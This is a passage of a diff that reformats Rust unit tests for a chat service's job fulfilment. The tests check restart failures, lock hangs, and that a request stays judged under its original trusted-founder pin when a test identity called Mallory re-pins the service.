         let r = fulfil(&svc, &job, Some(&repo)).unwrap();
         assert!(matches!(&r, Outcome::Failed { .. }), "{r:?}");
-        assert!(matches!(outcome(&svc, chat, &job), Some(ApplyOutcome::Failed { .. })));
+        assert!(matches!(
+            outcome(&svc, chat, &job),
+            Some(ApplyOutcome::Failed { .. })
+        ));
         let s = lock(&svc).load(chat).unwrap().unwrap();
         assert_eq!(s.proposals[0].status, ProposalStatus::Approved);
     }
@@ -632,10 +971,19 @@ mod tests {
     #[test]
     fn a_restart_before_the_commit_reports_a_failure() {
         let (svc, chat, _, job, tmp) = setup();
-        assert!(lock(&svc).store().claim_apply_attempt(job.request.id).unwrap());
+        assert!(lock(&svc)
+            .store()
+            .claim_apply_attempt(job.request.id)
+            .unwrap());
         let r = fulfil(&svc, &job, Some(&tmp.path().join("repo"))).unwrap();
-        assert!(matches!(&r, Outcome::Failed { reason } if reason.contains("restarted")), "{r:?}");
-        assert!(matches!(outcome(&svc, chat, &job), Some(ApplyOutcome::Failed { .. })));
+        assert!(
+            matches!(&r, Outcome::Failed { reason } if reason.contains("restarted")),
+            "{r:?}"
+        );
+        assert!(matches!(
+            outcome(&svc, chat, &job),
+            Some(ApplyOutcome::Failed { .. })
+        ));
     }
 
     /// A host serving several workspaces re-pins one `ChatService` to each
@@ -647,12 +995,19 @@ mod tests {
     /// log, so under her pin she would be its Owner and Ana no member.
     #[test]
     fn a_request_is_judged_under_the_pin_it_was_listed_under() {
-        let (svc, chat, wid, job, tmp) = setup_in(|dir| EventStore::open(dir.join("ligus.db")).unwrap());
+        let (svc, chat, wid, job, tmp) =
+            setup_in(|dir| EventStore::open(dir.join("ligus.db")).unwrap());
         assert_eq!(job.founder.as_deref(), lock(&svc).trusted_founder());
         let mallory_account = Uuid::new_v4();
-        let mut mallory_actor = ActorIdentity::new(mallory_account.to_string(), "Mallory", ActorKind::Human);
+        let mut mallory_actor =
+            ActorIdentity::new(mallory_account.to_string(), "Mallory", ActorKind::Human);
         mallory_actor.account_id = Some(mallory_account);
-        let mut mallory = ChatService::new(EventStore::open_in_memory().unwrap(), SigningKeypair::generate().unwrap(), SigningKeypair::generate().unwrap(), mallory_actor);
+        let mut mallory = ChatService::new(
+            EventStore::open_in_memory().unwrap(),
+            SigningKeypair::generate().unwrap(),
+            SigningKeypair::generate().unwrap(),
+            mallory_actor,
+        );
         let config = mallory.ensure_workspace_config(wid).unwrap();
         let mut second = EventStore::open(tmp.path().join("ligus.db")).unwrap();
         for env in mallory.store().list(config).unwrap() {
@@ -661,8 +1016,15 @@ mod tests {
         // Another workspace's write re-pinned the service to Mallory.
         lock(&svc).set_trusted_founder(Some(mallory_account.to_string()));
         let r = fulfil(&svc, &job, Some(&tmp.path().join("repo"))).unwrap();
-        assert!(matches!(r, Outcome::Applied { .. }), "judged under another workspace's pin: {r:?}");
-        assert_eq!(lock(&svc).trusted_founder(), Some(mallory_account.to_string().as_str()), "the service's own pin is left as it was");
+        assert!(
+            matches!(r, Outcome::Applied { .. }),
+            "judged under another workspace's pin: {r:?}"
+        );
+        assert_eq!(
+            lock(&svc).trusted_founder(),
+            Some(mallory_account.to_string().as_str()),
+            "the service's own pin is left as it was"
+        );
         let _ = chat;
     }
 
@@ -679,7 +1041,9 @@ mod tests {
             let r = fulfil(&svc, &job, Some(&repo));
             let _ = tx.send(format!("{r:?}"));
         });
-        let r = rx.recv_timeout(std::time::Duration::from_secs(60)).expect("fulfil hung on its own lock");
+        let r = rx
+            .recv_timeout(std::time::Duration::from_secs(60))
+            .expect("fulfil hung on its own lock");
         assert!(r.contains("Failed"), "{r}");
     }
 }
